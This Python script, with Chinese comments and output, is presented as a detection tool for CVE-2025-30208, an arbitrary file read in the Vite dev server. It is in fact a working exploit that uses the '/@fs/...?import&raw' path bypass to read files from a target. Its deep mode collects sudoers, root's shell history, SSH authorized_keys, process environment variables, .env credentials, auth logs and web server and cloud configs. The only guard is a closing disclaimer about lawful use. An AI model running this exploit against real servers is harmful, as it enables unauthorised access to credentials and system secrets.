import argparse
import requests
import sys
import re

# 忽略 HTTPS 报错
requests.packages.urllib3.disable_warnings()

# 控制台颜色类
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'  # 新增白色定义
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{Color.CYAN}{Color.BOLD}
╔════════════════════════════════════════════════════╗
║     CVE-2025-30208 漏洞检测工具（单目标）          ║
║       Author: lll_lll                              ║
╚════════════════════════════════════════════════════╝{Color.RESET}
""")

def try_read_file(url, filepath, proxy=None) -> str | None:
    """
    利用 @fs 路径尝试读取文件
    """
    proxies = {"http": proxy, "https": proxy} if proxy else None
    target_url = f"{url}/@fs/{filepath}?import&raw?&"
    print(f"{Color.YELLOW}[·] 尝试读取文件: {filepath}{Color.RESET}")

    try:
        resp = requests.get(target_url, proxies=proxies, verify=False, timeout=10)
        if resp.status_code == 200 and len(resp.text.strip()) > 0:
            print(f"{Color.GREEN}[+] 成功读取文件内容！{Color.RESET}")
            return resp.text
        else:
            print(f"{Color.RED}[-] 读取失败或无内容返回。{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[!] 请求异常: {e}{Color.RESET}")
    return None

def default_check(url, proxy=None) -> str | None:
    """
    默认读取敏感文件，判断是否存在漏洞
    """
    print(f"{Color.BOLD}[·] 未指定文件路径，尝试默认路径检测...{Color.RESET}")
    
    result = try_read_file(url, "etc/passwd", proxy)
    if result and "root" in result:
        return result

    result = try_read_file(url, "C://windows/win.ini", proxy)
    if result and "; for 16-bit app support" in result:
        return result

    return None

def basic_system_probe(url, proxy=None):
    """
    基础系统信息探测
    """
    print(f"{Color.BOLD}{Color.YELLOW}[·] 正在进行基础系统探测...{Color.RESET}")
    
    guesses = {
        "操作系统判断": [("etc/passwd", "Linux"),
                       ("C:/Windows/win.ini", "Windows")],
        "当前工作目录": [("proc/self/cwd", "Linux"),
                       ("C:/Windows/Temp", "Windows")],
        "容器虚拟环境": [("proc/1/cgroup", "Linux")]
    }

    detected = {}
    for tag, files in guesses.items():
        for filepath, os_type in files:
            content = try_read_file(url, filepath, proxy)
            if content:
                detected[tag] = {
                    "path": filepath,
                    "os": os_type,
                    "content": content[:200].strip().replace('\n', ' ')
                }
                break

    print("\n" + "=" * 60)
    if detected:
        print(f"{Color.GREEN}[√] 基础探测结果：{Color.RESET}")
        for key, val in detected.items():
            print(f"{Color.BOLD}- {key}:{Color.RESET}")
            print(f"  路径: {val['path']}   系统: {val['os']}")
            print(f"  内容: {Color.CYAN}{val['content']}...{Color.RESET}")
    else:
        print(f"{Color.RED}[-] 未发现有效系统信息{Color.RESET}")
    print("=" * 60 + "\n")

def deep_system_probe(url, proxy=None):
    """
    增强版系统探测（企业级深度检测）
    """
    print(f"{Color.BOLD}{Color.YELLOW}[·] 正在进行企业级深度环境探测（Lv.3）...{Color.RESET}")

    # 动态生成检测路径
    common_users = ["root", "ubuntu", "ec2-user", "admin", "www-data", "appuser"]
    authorized_keys_paths = [f"home/{user}/.ssh/authorized_keys" for user in common_users] + ["root/.ssh/authorized_keys"]
    
    guesses = {
        "用户权限识别（企业级）": [
            ("etc/sudoers", "Linux", "sudo权限配置"),
            ("root/.bash_history", "Linux", "root历史命令"),
            *[(path, "Linux", "SSH公钥检测") for path in authorized_keys_paths],
            ("var/log/auth.log", "Linux", "认证日志分析")
        ],
        "Web服务深度剖析": [
            ("proc/self/environ", "Linux", "环境变量提取"),
            ("proc/self/cmdline", "Linux", "启动命令分析"),
            (".env", "Linux", "敏感变量扫描"),
            ("web.config", "Windows", "IIS配置"),
            ("appsettings.json", "Linux", "ASP.NET配置")
        ],
        "中间件全栈检测": [
            ("etc/nginx/nginx.conf", "Linux", "Nginx配置"),
            ("etc/apache2/apache2.conf", "Linux", "Apache配置"),
            ("usr/local/tomcat/conf/server.xml", "Linux", "Tomcat配置"),
            ("proc/version", "Linux", "内核版本检测")
        ],
        "云环境指纹识别": [
            ("sys/class/dmi/id/product_name", "Linux", "虚拟化类型"),
            ("etc/cloud/cloud.cfg", "Linux", "Cloud-Init配置"),
            ("var/lib/cloud/instance", "Linux", "云元数据"),
            ("metadata.google.internal", "Linux", "GCP标识")
        ]
    }

    detected = {}
    risk_level = 0

    for category, items in guesses.items():
        for filepath, os_type, detect_type in items:
            content = try_read_file(url, filepath, proxy)
            if not content:
                continue
                
            # 深度分析逻辑
            analysis, risk = "", 0
            if category == "用户权限识别（企业级）":
                if "sudoers" in filepath:
                    analysis = "🛡️ Sudo策略分析:\n"
                    if "NOPASSWD" in content:
                        analysis += f"  {Color.RED}高危! 发现免密sudo权限{Color.RESET}\n"
                        risk += 2
                    if "(ALL:ALL) ALL" in content:
                        analysis += f"  {Color.YELLOW}警告! 宽泛权限配置{Color.RESET}\n"
                        risk += 1
                elif "bash_history" in filepath:
                    dangerous_cmds = ["ssh", "scp", "sudo", "wget", "curl"]
                    found = [cmd for cmd in dangerous_cmds if cmd in content]
                    if found:
                        analysis = f"🔍 发现敏感命令: {Color.RED}{', '.join(found)}{Color.RESET}\n"
                        risk += 1
                    analysis += f"📜 最后5条命令:\n  " + "\n  ".join(content.split('\n')[-5:])
                elif "authorized_keys" in filepath:
                    key_count = len(content.strip().split('\n'))
                    analysis = f"🔑 发现 {key_count} 条SSH公钥（用户：{filepath.split('/')[1]}）"
                    risk += 1 if key_count > 0 else 0

            elif category == "Web服务深度剖析":
                if "environ" in filepath:
                    env_vars = dict(pair.split('=', 1) for pair in content.split('\x00') if '=' in pair)
                    sensitive_keys = ["PASSWORD", "SECRET", "TOKEN"]
                    found_vars = [k for k in env_vars.keys() if any(s in k for s in sensitive_keys)]
                    analysis = "🔧 环境变量分析:\n"
                    analysis += f"  PATH: {env_vars.get('PATH','')}\n"
                    analysis += f"  USER: {env_vars.get('USER','')}\n"
                    if found_vars:
                        analysis += f"  {Color.RED}敏感变量: {', '.join(found_vars)}{Color.RESET}"
                        risk += 2
                elif ".env" in filepath:
                    secrets = re.findall(r'(API_KEY|PASSWORD)=([^\s]+)', content)
                    if secrets:
                        analysis = f"🔐 发现 {len(secrets)} 组敏感凭证:\n"
                        for k, v in secrets:
                            analysis += f"  {k}: {v[:4]}****{v[-2:]}\n"
                        risk += 3

            risk_level += risk
            detected.setdefault(category, []).append({
                "路径": filepath,
                "系统": os_type,
                "原始内容": content,
                "分析": analysis,
                "风险值": risk,
                "指纹特征": detect_type
            })

    # 企业级报告输出
    print(f"\n{Color.BOLD}{Color.RED}▄■▄■▄■ 深度检测报告 ■▄■▄■▄{Color.RESET}")
    risk_color = Color.RED if risk_level > 5 else Color.YELLOW if risk_level > 2 else Color.GREEN
    print(f"\n{Color.BOLD}⚡ 综合风险评级: {risk_color}{'高危' if risk_level>5 else '中危' if risk_level>2 else '低危'} ({risk_level}分){Color.RESET}")
    
    for category, items in detected.items():
        print(f"\n{Color.BOLD}▌ {category} {Color.CYAN}[{len(items)}项发现]{Color.RESET}")
        for item in items:
            print(f"\n  {Color.YELLOW}▶ 检测项: {item['指纹特征']} ({item['路径']})")
            print(f"  {Color.CYAN}├─ 风险值: {item['风险值']}")
            print(f"  ├─ 系统类型: {item['系统']}")
            if item['分析']:
                print(f"  ├─ 深度分析:\n{item['分析']}")
            print(f"  └─ 样本摘要: {Color.WHITE}{item['原始内容'][:150].strip()}...{Color.RESET}")
    
    if risk_level > 3:
        print(f"\n{Color.BOLD}🔧 安全建议:")
        print(f"  {Color.RED}1. 立即修复任意文件读取漏洞")
        print(f"  2. 检查发现的敏感凭证是否已泄露")
        print(f"  3. 审计高风险权限配置{Color.RESET}")
    print("\n"+ "="*60)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2025-30208 任意文件读取漏洞检测工具")
    parser.add_argument("-u", "--url", required=True, help="目标 URL（例如：http://127.0.0.1:5173）")
    parser.add_argument("-r", "--file-path", help="要读取的敏感文件路径（例如：/etc/shadow）")
    parser.add_argument("-i", "--info", action="store_true", help="基础系统信息探测")
    parser.add_argument("-d", "--deep", action="store_true", help="启用增强探测，获取更多系统信息")
    parser.add_argument("-p", "--proxy", help="HTTP/HTTPS 代理地址（例如：http://127.0.0.1:8080）")

    args = parser.parse_args()
    url = args.url.strip().rstrip('/')
    proxy = args.proxy

    print(f"{Color.BOLD}[+] 开始检测目标：{url}{Color.RESET}\n")

    if args.info:
        basic_system_probe(url, proxy)
    if args.deep:
        deep_system_probe(url, proxy)

    if args.file_path:
        result = try_read_file(url, args.file_path, proxy)
    else:
        result = default_check(url, proxy)

    print("\n" + "="*60)
    if result:
        print(f"{Color.GREEN}[√] 漏洞存在！成功读取目标文件：{args.file_path or '默认路径'}{Color.RESET}")
        print(f"{Color.BOLD}以下是部分内容（最多显示 500 字符）：{Color.RESET}\n")
        print(f"{Color.CYAN}{result[:500]}...{Color.RESET}")
        print("\n[!] 请合法使用此工具，禁止用于未授权测试。")
    else:
        print(f"{Color.RED}[-] 未发现漏洞或读取失败。{Color.RESET}")
    print("="*60 + "\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[×] 用户中断，程序退出。{Color.RESET}")
        sys.exit()